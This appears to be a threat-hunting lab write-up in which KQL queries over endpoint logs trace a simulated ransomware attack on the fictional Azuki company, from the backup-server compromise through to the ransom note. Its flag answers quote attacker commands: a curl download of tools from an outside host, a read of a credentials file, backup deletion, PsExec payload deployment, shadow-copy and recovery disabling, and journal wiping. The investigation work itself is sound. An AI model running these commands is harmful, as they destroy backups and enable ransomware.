### SITUATION: 
It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.

Your CEO needs answers:

  - How did they get to our backup infrastructure?

  - What exactly did they destroy?

  - How did the ransomware spread so fast?

  - Can we recover?
---

### PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)
---

#### FLAG 1: LATERAL MOVEMENT - Remote Access
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ProcessCommandLine has_any ("ssh", "@")
| where AccountName !in ("system", "local service", "")
| where AccountDomain != " "
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, ProcessCreationTime

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De1.png)

*Question: What remote access command was executed from the compromised workstation?*

```
"ssh.exe" backup-admin@10.1.0.189
```

#### FLAG 2: LATERAL MOVEMENT - Attack Source
Identifying the attack source enables network segmentation and containment.

```
DeviceNetworkEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where RemoteIP == "10.1.0.189"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessVersionInfoFileDescription, LocalIP

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De2.png)

*Question: What IP address initiated the connection to the backup server?*

```
10.1.0.108
```

#### FLAG 3: CREDENTIAL ACCESS - Compromised Account

Administrative accounts with backup privileges provide access to critical recovery infrastructure.

```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ProcessCommandLine has_any ("ssh", "@")
| where AccountName !in ("system", "local service", "")
| where AccountDomain != " "
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, ProcessCreationTime

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De3.png)

*Question: What account was used to access the backup server?*
```
backup-admin
```

#### FLAG 4: DISCOVERY - Directory Enumeration
File system enumeration reveals backup locations and valuable targets for destruction.

```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where AccountName == "backup-admin"
| where FileName == "ls"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessCreationTime
| order by TimeGenerated asc  
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De4a.png)

*Question: What command listed the backup directory contents?*
```
ls --color=auto -la /backups/
```

####  FLAG 5: DISCOVERY - File Search
Attackers search for specific file types to identify high-value targets.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName == "backup-admin"
| where ProcessCommandLine has "find"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De5.png)

*Question: What command searched for backup archives?*
```
find /backups -name *.tar.gz
```


####  FLAG 6: DISCOVERY - Account Enumeration
Attackers enumerate local accounts to understand the system's user base.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De6.png)

*Question: What command enumerated local accounts?*

```
cat /etc/passwd
```

#### FLAG 7: DISCOVERY - Scheduled Job Reconnaissance
Understanding backup schedules helps attackers time their destruction for maximum impact.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De7.png)

*Question: What command revealed scheduled jobs on the system?*

```
cat /etc/crontab
```

#### FLAG 8: COMMAND AND CONTROL - Tool Transfer
Attackers download tools from external infrastructure to carry out the attack.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("curl", "wget")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De8.png)

*Question: What command downloaded external tools?*
```
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

#### FLAG 9: CREDENTIAL ACCESS - Credential Theft
Backup servers often store sensitive configuration files containing credentials.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat /backups"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De9.png)

*Question: What command accessed stored credentials?*
```
cat /backups/configs/all-credentials.txt
```

#### FLAG 10: IMPACT - Data Destruction
Destroying backups eliminates recovery options and maximises ransomware impact.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("rm -rf", "backups")
| where FileName !in ("ls", "cat")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De10.png)

*Question: What command destroyed backup files?*
```
rm -rf /backups/config-backups/*
```

#### FLAG 11: IMPACT - Service Stopped
Stopping services takes effect immediately but does NOT survive a reboot.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("systemctl stop")
| where AccountName == "root"
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De11a.png)

*Question: What command stopped the backup service?*
```
systemctl stop cron
```

#### FLAG 12: IMPACT - Service Disabled

Disabling a service prevents it from starting at boot - this SURVIVES a reboot.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has "systemctl disable"
| where AccountName == "root"
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De12.png)

*Question: What command permanently disabled the backup service?*
```
systemctl disable cron
```
---

### PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)
---

####  FLAG 13: LATERAL MOVEMENT - Remote Execution

Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where AccountName != "system"
| where ProcessCommandLine contains "Psexec64.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De13.png)

*Question: What tool executed commands on remote systems?*

```
PsExec64.exe
```
#### FLAG 14: LATERAL MOVEMENT - Deployment Command

Full command lines reveal target systems, credentials, and deployed payloads.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where AccountName != "system"
| where ProcessCommandLine contains "Psexec64.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De14.png)

*Question: What is the full deployment command?*
```
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

#### FLAG 15: EXECUTION - Malicious Payload
Identifying the payload enables threat hunting across the environment.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where ProcessCommandLine contains "silentlynx.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De15.png)

*Question: What payload was deployed?*
```
silentlynx.exe
```
---

### PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)

---

####  FLAG 16: IMPACT - Shadow Service Stopped

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "VSS" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De16.png)

*Question: What command stopped the shadow copy service?*
```
"net" stop VSS /y
```

#### FLAG 17: IMPACT - Backup Engine Stopped
Stopping backup engines prevents backup operations during the attack.
```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains '"net"' 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De17.png)

*Question: What command stopped the backup engine?*
```
"net" stop wbengine /y
```

#### FLAG 18: DEFENSE EVASION - Process Termination

Certain processes lock files and must be terminated before encryption can succeed.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains '"taskkill"' 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc 
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De18.png)

*Question: What command terminated processes to unlock files?*

```
"taskkill" /F /IM sqlservr.exe
```
#### FLAG 19: IMPACT - Recovery Point Deletion
Recovery points enable rapid file recovery without external backups.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "shadow" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
Result 
![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De19.png)

*Question: What command deleted recovery points?*

```
"vssadmin" delete shadows /all /quiet
```

####  FLAG 20: IMPACT - Storage Limitation

Limiting storage prevents new recovery points from being created.
```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "shadow" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc 
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De20.png)

*Question: What command limited recovery storage?*

```
"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

####  FLAG 21: IMPACT - Recovery Disabled

Windows recovery features enable automatic system repair after corruption.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("cmd", "bcdedit")
| where AccountName !in ("system", "network service", "local service")
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De21.png)

*Question: What command disabled system recovery?*

```
"bcdedit" /set {default} recoveryenabled No
```

#### FLAG 22: IMPACT - Catalog Deletion

Backup catalogues track available restore points and backup versions.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has " catalog"
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```
Result 

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De22.png)

*Question: What command deleted the backup catalogue?*

```
"wbadmin" delete catalog -quiet
```
---

###  PHASE 4: PERSISTENCE (FLAGS 23-24)
---

#### FLAG 23: PERSISTENCE - Registry Autorun
Registry keys can execute programs automatically at system startup

```
DeviceRegistryEvents
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any(@"\Software\Microsoft\Windows\CurrentVersion\Run", @"\Software\Microsoft\Windows\CurrentVersion\RunOnce")
| project TimeGenerated, ActionType,  DeviceName, InitiatingProcessAccountName, RegistryValueName, InitiatingProcessCommandLine, RegistryValueData
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De23.png)

*Question: What registry value establishes persistence?*

```
WindowsSecurityHealth
```

#### FLAG 24: PERSISTENCE - Scheduled Execution

Scheduled jobs provide reliable persistence with configurable triggers.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has "schtasks"
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De24.png)

*Question: What scheduled task was created?*

```
Microsoft\Windows\Security\SecurityHealthService
```

---

### PHASE 5: ANTI-FORENSICS (FLAG 25)

---

#### FLAG 25: DEFENSE EVASION - Journal Deletion

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "usn"
| where AccountName != "system"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De25.png)

*Question: What command deleted forensic evidence?*

```
"fsutil.exe" usn deletejournal /D C:
```
---
### PHASE 6: RANSOMWARE SUCCESS (FLAG 26)

---

#### FLAG 26: IMPACT - Ransom Note

Ransom notes typically communicate payment instructions and indicate that the encryption has been successful.

```
DeviceFileEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where FileName has_any ("SILENTLYNX", " .txt")
| where ActionType == "FileCreated"
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De26.png)

*Question: What is the filename of the ransom note?*

```
SILENTLYNX_README.txt
```
